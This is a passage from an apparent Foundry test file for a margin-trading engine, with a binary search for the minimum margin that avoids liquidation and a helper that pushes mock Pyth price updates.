        uint256 startTime = block.timestamp;
        uint256 startBlock = block.number;
        while (lo <= hi) {
            uint256 mid = (lo + hi) / 2;
            uint256 snap = vm.snapshotState();
            vm.prank(account);
            engine.addMargin(account, mid);
            vm.warp(checkTime);
            bool liquidatable = _liquidatable(account);
            vm.revertToState(snap);
            vm.warp(startTime);
            vm.roll(startBlock);
            if (liquidatable) {
                lo = mid + 1;
            } else {
                best = mid;
                if (mid == 0) {
                    break;
                }
                hi = mid - 1;
            }
        }
    }

    function _liveRefresh(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        bytes[] memory updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
        router.updateMarkPrice(updateData);
    }

}
```
